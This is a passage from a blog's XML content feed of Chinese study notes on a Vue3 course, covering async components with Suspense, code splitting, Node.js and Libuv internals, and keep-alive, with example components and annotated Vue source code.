class="property">ARRAY_CHILDREN</span>) &#123;</span><br><span class="line">        <span class="comment">// 遍历teleport子节点，用unmount方法移除</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; (children <span class="keyword">as</span> <span class="title class_">VNode</span>[]).<span class="property">length</span>; i++) &#123;</span><br><span class="line">          <span class="keyword">const</span> child = (children <span class="keyword">as</span> <span class="title class_">VNode</span>[])[i]</span><br><span class="line">          <span class="title function_">unmount</span>(</span><br><span class="line">            child,</span><br><span class="line">            parentComponent,</span><br><span class="line">            parentSuspense,</span><br><span class="line">            <span class="literal">true</span>,</span><br><span class="line">            !!child.<span class="property">dynamicChildren</span></span><br><span class="line">          )</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">move</span>: moveTeleport,</span><br><span class="line">  <span class="attr">hydrate</span>: hydrateTeleport</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>异步组件＆代码分包＆suspense</title>
    <url>/web/study/Vue/18.%E5%BC%82%E6%AD%A5%E7%BB%84%E4%BB%B6%EF%BC%86%E4%BB%A3%E7%A0%81%E5%88%86%E5%8C%85%EF%BC%86suspense.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="异步组件"><a href="#异步组件" class="headerlink" title="异步组件"></a>异步组件</h1><p>使用骨架屏理解异步组件。</p>
<p>sync.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;sync&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;sync-content&quot;&gt;</span><br><span class="line">      &lt;div&gt;&lt;img :src=&quot;data.url&quot; alt=&quot;&quot;&gt;&#123;&#123; data.name &#125;&#125;&lt;/div&gt;</span><br><span class="line">      &lt;hr&gt;</span><br><span class="line">      &lt;div class=&quot;sync-pop&quot;&gt;</span><br><span class="line">        &lt;div&gt;&#123;&#123; data.desc &#125;&#125;&lt;/div&gt;</span><br><span class="line">        &lt;div&gt;&amp;nbsp;&lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; axios &#125; from &quot;@/server/axios&quot;</span><br><span class="line"></span><br><span class="line">interface Data &#123;</span><br><span class="line">  data: &#123;</span><br><span class="line">    name: string,</span><br><span class="line">    age: number,</span><br><span class="line">    url: string,</span><br><span class="line">    desc: string</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ES7中引入的顶层await技术</span><br><span class="line">// 可以直接在一个模块的最外层使用await</span><br><span class="line">// 这让整个模块看起来像一个巨大的async函数</span><br><span class="line">// mock数据将在发送请求的2秒后收到</span><br><span class="line">const &#123; data &#125; = await axios.get&lt;Data&gt;(&quot;./data.json&quot;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.sync &#123;</span><br><span class="line">  width: 500px;</span><br><span class="line">  background-color: #eee;</span><br><span class="line">  padding: 10px;</span><br><span class="line">  .sync-content &#123;</span><br><span class="line">    div &#123;</span><br><span class="line">      font-size: 12px;</span><br><span class="line">      img &#123;</span><br><span class="line">        width: 50px;</span><br><span class="line">        height: 50px;</span><br><span class="line">        border-radius: 50%;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>skeleton.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;sk&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;sk-2&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;avatar&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;name&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;div class=&quot;sk-3&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;sk-3&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.sk &#123;</span><br><span class="line">  width: 500px;</span><br><span class="line">  background-color: #eee;</span><br><span class="line">  padding: 10px;</span><br><span class="line">  .sk-2 &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    align-items: baseline;</span><br><span class="line">    .avatar &#123;</span><br><span class="line">        width: 50px;</span><br><span class="line">        height: 50px;</span><br><span class="line">        background-color: #ccc;</span><br><span class="line">        border-radius: 50%;</span><br><span class="line">      &#125;</span><br><span class="line">    .name &#123;</span><br><span class="line">      width: 50px;</span><br><span class="line">      height: 12px;</span><br><span class="line">      background-color: #ccc;  </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  .sk-3 &#123;</span><br><span class="line">    height: 12px;</span><br><span class="line">    background-color: #ccc;</span><br><span class="line">    &amp;:last-child &#123;</span><br><span class="line">      margin-top: 6px;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- 展示异步组件必须使用suspense --&gt;</span><br><span class="line">    &lt;Suspense&gt;</span><br><span class="line">      &lt;!-- 主要展示的组件 --&gt;</span><br><span class="line">      &lt;template #default&gt;</span><br><span class="line">        &lt;sync&gt;&lt;/sync&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">      &lt;!-- 加载时呈现的组件 --&gt;</span><br><span class="line">      &lt;template #fallback&gt;</span><br><span class="line">        &lt;skeleton&gt;&lt;/skeleton&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">    &lt;/Suspense&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; defineAsyncComponent, ref &#125; from &#x27;vue&#x27;</span><br><span class="line">import skeleton from &#x27;./components/expame/skeleton.vue&#x27;</span><br><span class="line"></span><br><span class="line">// 使用defineAsyncComponent引入异步组件，支持两种书写风格</span><br><span class="line">// 动态组件形式</span><br><span class="line">const sync = defineAsyncComponent(()=&gt; import(&quot;@/components/expame/sync.vue&quot;))</span><br><span class="line">// 配置对象形式，几乎用不到</span><br><span class="line">// const sync = defineAsyncComponent(&#123;</span><br><span class="line">//   loadingComponent: ()=&gt; import(&quot;@/components/expame/sync.vue&quot;),</span><br><span class="line">//   errorComponent: ...,</span><br><span class="line">//   timeout: ...,</span><br><span class="line">// &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="代码分包"><a href="#代码分包" class="headerlink" title="代码分包"></a>代码分包</h1><p>vue代码默认只会被打包成一个js文件（主包），使用同步方式引入的组件就在其中。</p>
<p>将组件异步引入，打包后组件就会被实现分包，不会放在主包内，可以缩短首次加载的时间。</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>Node.js底层原理</title>
    <url>/web/study/Vue/2.nodejs%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<p>图片全部搬运自<a href="https://xiaoman.blog.csdn.net/article/details/122769982">学习Vue3 第二章（配置环境）</a><del>自己懒得做图了</del>。</p>
<h1 id="Node-js的构成"><a href="#Node-js的构成" class="headerlink" title="Node.js的构成"></a>Node.js的构成</h1><p>Node.js主要由V8、Libuv和第三方库组成。</p>
<ul>
<li>Libuv：跨平台异步IO库（处理事件循环），除了IO功能还提供线程、进程、信号、定时器、进程间通信、线程池等功能。</li>
<li>第三方库<ul>
<li>异步DNS解析（cares）</li>
<li>HTTP解析器（旧版：http_parser；新版：llhttp）</li>
<li>HTTP2解析器（nghttp2）</li>
<li>解压压缩库（zlib）</li>
<li>加密解密库（openssl）</li>
<li>等等等等</li>
</ul>
</li>
<li>V8：实现JS解析（把js编译成机器码）、执行和自定义拓展</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305012242595.png"></p>
<p>从上到下分为三层：</p>
<ul>
<li>应用层：Node.js API各种模块，基于Libuv，因为可能涉及IO流操作</li>
<li>桥梁层：与底层C或C++通信</li>
<li>底层（C++或C）：处理底层机制</li>
</ul>
<h1 id="Libuv"><a href="#Libuv" class="headerlink" title="Libuv"></a>Libuv</h1><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305012253451.png"></p>
<ul>
<li><p>loop参数：事件循环结构的结构体</p>
</li>
<li><p>uv_loop_alive：用于注册loop，判断loop里有无任务（是否还有活动），有就开始循环，没有就退出</p>
<blockquote>
<p>loop还在活动的情况：</p>
<ol>
<li>有被引用的活动句柄或活动请求</li>
<li>有正在关闭的句柄</li>
</ol>
</blockquote>
</li>
<li><p>uv_update_time：执行setTimeOut（过段时间后执行回调）</p>
</li>
<li><p>uv_run_timers：执行setInterval（每隔一段时间都执行回调）</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305012303489.png"></p>
<ul>
<li>数据结构：链表+二叉堆</li>
<li>把最快过期的节点放到上面，判断是否过期<ul>
<li>如果过期就执行回调</li>
<li>如果没有过期，查看repeat，区分setTimeOut和setInterval<ul>
<li>如果是setTimeOut，任务过期后就结束了</li>
<li>如果是setInterval，进行重复执行</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>uv_run_pending：处理IO流的回调</p>
</li>
<li><p>uv_run_idle&amp;uv_run_prepare：处理其他各种队列</p>
</li>
<li><p>uv_io_poll：处理网络相关</p>
</li>
<li><p>uv_run_closing_handles：结束，关闭服务器</p>
</li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Node.js</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>keep-alive缓存组件</title>
    <url>/web/study/Vue/20.keep-alive%E7%BC%93%E5%AD%98%E7%BB%84%E4%BB%B6.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="keep-alive"><a href="#keep-alive" class="headerlink" title="keep-alive"></a>keep-alive</h1><p>有时程序员不希望组件被重新渲染影响使用体验，或出于性能考虑，避免多次重复渲染降低性能，而是希望组件被缓存下来，维持状态。</p>
<p>此时可以使用keep-alive，开启keep-alive后组件的生命周期变为：</p>
<ol>
<li>初次进入时：onMounted→onActivated</li>
<li>退出是：deactivated</li>
<li>再次进入：只触发onActivated</li>
</ol>
<p>所以在keep-alive组件中使用钩子函数时，只执行一次的逻辑放在onMounted中，每次进入组件都要执行的方法放在onActivated中。</p>
<p>A.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;el-card&gt;</span><br><span class="line">    &lt;h1&gt;我是A组件&lt;/h1&gt;</span><br><span class="line">    &lt;el-form :model=&quot;form&quot; label-width=&quot;120px&quot;&gt;</span><br><span class="line">      &lt;el-form-item label=&quot;Activity name&quot;&gt;</span><br><span class="line">        &lt;el-input v-model=&quot;form.name&quot; /&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">      &lt;el-form-item label=&quot;Activity zone&quot;&gt;</span><br><span class="line">        &lt;el-select v-model=&quot;form.region&quot; placeholder=&quot;please select your zone&quot;&gt;</span><br><span class="line">          &lt;el-option label=&quot;Zone one&quot; value=&quot;shanghai&quot; /&gt;</span><br><span class="line">          &lt;el-option label=&quot;Zone two&quot; value=&quot;beijing&quot; /&gt;</span><br><span class="line">        &lt;/el-select&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">      &lt;el-form-item label=&quot;Activity time&quot;&gt;</span><br><span class="line">        &lt;el-col :span=&quot;11&quot;&gt;</span><br><span class="line">          &lt;el-date-picker v-model=&quot;form.date1&quot; type=&quot;date&quot; placeholder=&quot;Pick a date&quot; style=&quot;width: 100%&quot; /&gt;</span><br><span class="line">        &lt;/el-col&gt;</span><br><span class="line">        &lt;el-col :span=&quot;2&quot; class=&quot;text-center&quot;&gt;</span><br><span class="line">          &lt;span class=&quot;text-gray-500&quot;&gt;-&lt;/span&gt;</span><br><span class="line">        &lt;/el-col&gt;</span><br><span class="line">        &lt;el-col :span=&quot;11&quot;&gt;</span><br><span class="line">          &lt;el-time-picker v-model=&quot;form.date2&quot; placeholder=&quot;Pick a time&quot; style=&quot;width: 100%&quot; /&gt;</span><br><span class="line">        &lt;/el-col&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">      &lt;el-form-item label=&quot;Instant delivery&quot;&gt;</span><br><span class="line">        &lt;el-switch v-model=&quot;form.delivery&quot; /&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">      &lt;el-form-item label=&quot;Activity type&quot;&gt;</span><br><span class="line">        &lt;el-checkbox-group v-model=&quot;form.type&quot;&gt;</span><br><span class="line">          &lt;el-checkbox label=&quot;Online activities&quot; name=&quot;type&quot; /&gt;</span><br><span class="line">          &lt;el-checkbox label=&quot;Promotion activities&quot; name=&quot;type&quot; /&gt;</span><br><span class="line">          &lt;el-checkbox label=&quot;Offline activities&quot; name=&quot;type&quot; /&gt;</span><br><span class="line">          &lt;el-checkbox label=&quot;Simple brand exposure&quot; name=&quot;type&quot; /&gt;</span><br><span class="line">        &lt;/el-checkbox-group&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">      &lt;el-form-item label=&quot;Resources&quot;&gt;</span><br><span class="line">        &lt;el-radio-group v-model=&quot;form.resource&quot;&gt;</span><br><span class="line">          &lt;el-radio label=&quot;Sponsor&quot; /&gt;</span><br><span class="line">          &lt;el-radio label=&quot;Venue&quot; /&gt;</span><br><span class="line">        &lt;/el-radio-group&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">      &lt;el-form-item label=&quot;Activity form&quot;&gt;</span><br><span class="line">        &lt;el-input v-model=&quot;form.desc&quot; type=&quot;textarea&quot; /&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">      &lt;el-form-item&gt;</span><br><span class="line">        &lt;el-button type=&quot;primary&quot; @click=&quot;onSubmit&quot;&gt;Create&lt;/el-button&gt;</span><br><span class="line">        &lt;el-button&gt;Cancel&lt;/el-button&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">    &lt;/el-form&gt;</span><br><span class="line">  &lt;/el-card&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&#x27;ts&#x27;&gt;</span><br><span class="line">import &#123; onMounted, onUnmounted, onActivated, onDeactivated, reactive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const form = reactive(&#123;</span><br><span class="line">  name: &#x27;&#x27;,</span><br><span class="line">  region: &#x27;&#x27;,</span><br><span class="line">  date1: &#x27;&#x27;,</span><br><span class="line">  date2: &#x27;&#x27;,</span><br><span class="line">  delivery: false,</span><br><span class="line">  type: [],</span><br><span class="line">  resource: &#x27;&#x27;,</span><br><span class="line">  desc: &#x27;&#x27;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">const onSubmit = () =&gt; &#123;</span><br><span class="line">  console.log(&#x27;submit!&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">onMounted(() =&gt; &#123;</span><br><span class="line">  console.log(&quot;mounted&quot;)</span><br><span class="line">&#125;)</span><br><span class="line">onActivated(()=&gt; &#123;</span><br><span class="line">  console.log(&quot;activated, keep-alive初始化&quot;)</span><br><span class="line">&#125;)</span><br><span class="line">onDeactivated(()=&gt; &#123;</span><br><span class="line">  console.log(&quot;deactivated, keep-alive卸载&quot;)</span><br><span class="line">&#125;)</span><br><span class="line">onUnmounted(()=&gt; &#123;</span><br><span class="line">  console.log(&quot;unmounted&quot;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>B.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;el-card&gt;</span><br><span class="line">      &lt;h1&gt;我是B组件&lt;/h1&gt;</span><br><span class="line">      &lt;el-transfer v-model=&quot;value&quot; :data=&quot;data&quot; /&gt;</span><br><span class="line">    &lt;/el-card&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">interface Option &#123;</span><br><span class="line">  key: number</span><br><span class="line">  label: string</span><br><span class="line">  disabled: boolean</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const generateData = () =&gt; &#123;</span><br><span class="line">  const data: Option[] = []</span><br><span class="line">  for (let i = 1; i &lt;= 15; i++) &#123;</span><br><span class="line">    data.push(&#123;</span><br><span class="line">      key: i,</span><br><span class="line">      label: `Option $&#123;i&#125;`,</span><br><span class="line">      disabled: i % 4 === 0,</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  return data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const data = ref&lt;Option[]&gt;(generateData())</span><br><span class="line">const value = ref([])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;el-button type=&quot;primary&quot; @click=&quot;flag = !flag&quot;&gt;切换组件&lt;/el-button&gt;</span><br><span class="line">  &lt;!-- keep-alive可以为组件做缓存，并保存状态 --&gt;</span><br><span class="line">  &lt;!-- 如果只想缓存部分组件，使用include，传入一个需缓存组件名的数组 --&gt;</span><br><span class="line">  &lt;!-- 如果不想缓存某些组件，使用exclude，传入一个不缓存组件名的数组 --&gt;</span><br><span class="line">  &lt;!-- 如果需要指定最大缓存量，使用max --&gt;</span><br><span class="line">  &lt;keep-alive :include=&quot;[&#x27;A&#x27;]&quot; :exclude=&quot;[&#x27;B&#x27;]&quot; :max=&quot;10&quot;&gt;</span><br><span class="line">    &lt;A v-if=&quot;flag&quot;&gt;&lt;/A&gt;</span><br><span class="line">    &lt;B v-else&gt;&lt;/B&gt;</span><br><span class="line">  &lt;/keep-alive&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;</span><br><span class="line">import A from &quot;@/components/A.vue&quot;</span><br><span class="line">import B from &quot;@/components/B.vue&quot;</span><br><span class="line"></span><br><span class="line">const flag = ref&lt;boolean&gt;(true)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>在Vue源码（<code>/package/runtime-core/src/components/KeepAlive.ts</code>）中可以看到keep-alive的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// keep-alive的缓存机制</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">cache</span>: <span class="title class_">Cache</span> = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"><span class="keyword">const</span> <span class="attr">keys</span>: <span class="title class_">Keys</span> = <span class="keyword">new</span> <span class="title class_">Set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">KeepAliveImpl</span>: <span class="title class_">ComponentOptions</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">`KeepAlive`</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Marker for special handling inside the renderer. We are not using a ===</span></span><br><span class="line">  <span class="comment">// check directly on KeepAlive in the renderer, because importing it directly</span></span><br><span class="line">  <span class="comment">// would prevent it from being tree-shaken.</span></span><br><span class="line">  <span class="attr">__isKeepAlive</span>: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">  <span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">include</span>: [<span class="title class_">String</span>, <span class="title class_">RegExp</span>, <span class="title class_">Array</span>],	<span class="comment">// 只有名称匹配的组件会被缓存</span></span><br><span class="line">    <span class="attr">exclude</span>: [<span class="title class_">String</span>, <span class="title class_">RegExp</span>, <span class="title class_">Array</span>],	<span class="comment">// 任何名称匹配的组件都不被缓存</span></span><br><span class="line">    <span class="attr">max</span>: [<span class="title class_">String</span>, <span class="title class_">Number</span>]		<span class="comment">// 最多可以缓存多少组件实例</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="title function_">setup</span>(<span class="params">props: KeepAliveProps, &#123; slots &#125;: SetupContext</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> instance = <span class="title function_">getCurrentInstance</span>()!</span><br><span class="line">    <span class="comment">// KeepAlive communicates with the instantiated renderer via the</span></span><br><span class="line">    <span class="comment">// ctx where the renderer passes in its internals,</span></span><br><span class="line">    <span class="comment">// and the KeepAlive instance exposes activate/deactivate implementations.</span></span><br><span class="line">    <span class="comment">// The whole point of this is to avoid importing KeepAlive directly in the</span></span><br><span class="line">    <span class="comment">// renderer to facilitate tree-shaking.</span></span><br><span class="line">    <span class="keyword">const</span> sharedContext = instance.<span class="property">ctx</span> <span class="keyword">as</span> <span class="title class_">KeepAliveContext</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// if the internal renderer is not registered, it indicates that this is server-side rendering,</span></span><br><span class="line">    <span class="comment">// for KeepAlive, we just need to render its children</span></span><br><span class="line">    <span class="keyword">if</span> (__SSR__ &amp;&amp; !sharedContext.<span class="property">renderer</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> children = slots.<span class="property">default</span> &amp;&amp; slots.<span class="title function_">default</span>()</span><br><span class="line">        <span class="keyword">return</span> children &amp;&amp; children.<span class="property">length</span> === <span class="number">1</span> ? children[<span class="number">0</span>] : children</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">cache</span>: <span class="title class_">Cache</span> = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">keys</span>: <span class="title class_">Keys</span> = <span class="keyword">new</span> <span class="title class_">Set</span>()</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">current</span>: <span class="title class_">VNode</span> | <span class="literal">null</span> = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__DEV__ || __FEATURE_PROD_DEVTOOLS__) &#123;</span><br><span class="line">      ;(instance <span class="keyword">as</span> <span class="built_in">any</span>).<span class="property">__v_cache</span> = cache</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> parentSuspense = instance.<span class="property">suspense</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123;</span><br><span class="line">      <span class="attr">renderer</span>: &#123;</span><br><span class="line">        <span class="attr">p</span>: patch,</span><br><span class="line">        <span class="attr">m</span>: move,</span><br><span class="line">        <span class="attr">um</span>: _unmount,</span><br><span class="line">        <span class="attr">o</span>: &#123; createElement &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; = sharedContext</span><br><span class="line">    <span class="comment">// 隐藏容器</span></span><br><span class="line">    <span class="keyword">const</span> storageContainer = <span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在实例上注册activate和deactivated两个钩子</span></span><br><span class="line">    sharedContext.<span class="property">activate</span> = <span class="function">(<span class="params">vnode, container, anchor, isSVG, optimized</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> instance = vnode.<span class="property">component</span>!</span><br><span class="line">      <span class="title function_">move</span>(vnode, container, anchor, <span class="title class_">MoveType</span>.<span class="property">ENTER</span>, parentSuspense)</span><br><span class="line">      <span class="comment">// in case props have changed</span></span><br><span class="line">      <span class="comment">// props可能发生变化，所以patch</span></span><br><span class="line">      <span class="title function_">patch</span>(</span><br><span class="line">        instance.<span class="property">vnode</span>,</span><br><span class="line">        vnode,</span><br><span class="line">        container,</span><br><span class="line">        anchor,</span><br><span class="line">        instance,</span><br><span class="line">        parentSuspense,</span><br><span class="line">        isSVG,</span><br><span class="line">        vnode.<span class="property">slotScopeIds</span>,</span><br><span class="line">        optimized</span><br><span class="line">      )</span><br><span class="line">      <span class="comment">// 异步队列，patch完成后，执行子节点的activate和deactivated</span></span><br><span class="line">      <span class="title function_">queuePostRenderEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        instance.<span class="property">isDeactivated</span> = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">if</span> (instance.<span class="property">a</span>) &#123;</span><br><span class="line">          <span class="title function_">invokeArrayFns</span>(instance.<span class="property">a</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> vnodeHook = vnode.<span class="property">props</span> &amp;&amp; vnode.<span class="property">props</span>.<span class="property">onVnodeMounted</span></span><br><span class="line">        <span class="keyword">if</span> (vnodeHook) &#123;</span><br><span class="line">          <span class="title function_">invokeVNodeHook</span>(vnodeHook, instance.<span class="property">parent</span>, vnode)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, parentSuspense)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__DEV__ || __FEATURE_PROD_DEVTOOLS__) &#123;</span><br><span class="line">        <span class="comment">// Update components tree</span></span><br><span class="line">        <span class="title function_">devtoolsComponentAdded</span>(instance)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sharedContext.<span class="property">deactivate</span> = <span class="function">(<span class="params">vnode: VNode</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> instance = vnode.<span class="property">component</span>!</span><br><span class="line">      <span class="comment">// 将组件移动到隐藏容器中</span></span><br><span class="line">      <span class="comment">// 并非真正卸载组件，而是调用move方法，将组件搬运到一个隐藏容器中</span></span><br><span class="line">      <span class="title function_">move</span>(vnode, storageContainer, <span class="literal">null</span>, <span class="title class_">MoveType</span>.<span class="property">LEAVE</span>, parentSuspense)</span><br><span class="line">      <span class="title function_">queuePostRenderEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance.<span class="property">da</span>) &#123;</span><br><span class="line">          <span class="title function_">invokeArrayFns</span>(instance.<span class="property">da</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> vnodeHook = vnode.<span class="property">props</span> &amp;&amp; vnode.<span class="property">props</span>.<span class="property">onVnodeUnmounted</span></span><br><span class="line">        <span class="keyword">if</span> (vnodeHook) &#123;</span><br><span class="line">          <span class="title function_">invokeVNodeHook</span>(vnodeHook, instance.<span class="property">parent</span>, vnode)</span><br><span class="line">        &#125;</span><br><span class="line">        instance.<span class="property">isDeactivated</span> = <span class="literal">true</span></span><br><span class="line">      &#125;, parentSuspense)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__DEV__ || __FEATURE_PROD_DEVTOOLS__) &#123;</span><br><span class="line">        <span class="comment">// Update components tree</span></span><br><span class="line">        <span class="title function_">devtoolsComponentAdded</span>(instance)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">unmount</span>(<span class="params">vnode: VNode</span>) &#123;</span><br><span class="line">      <span class="comment">// reset the shapeFlag so it can be properly unmounted</span></span><br><span class="line">      <span class="title function_">resetShapeFlag</span>(vnode)</span><br><span class="line">      <span class="title 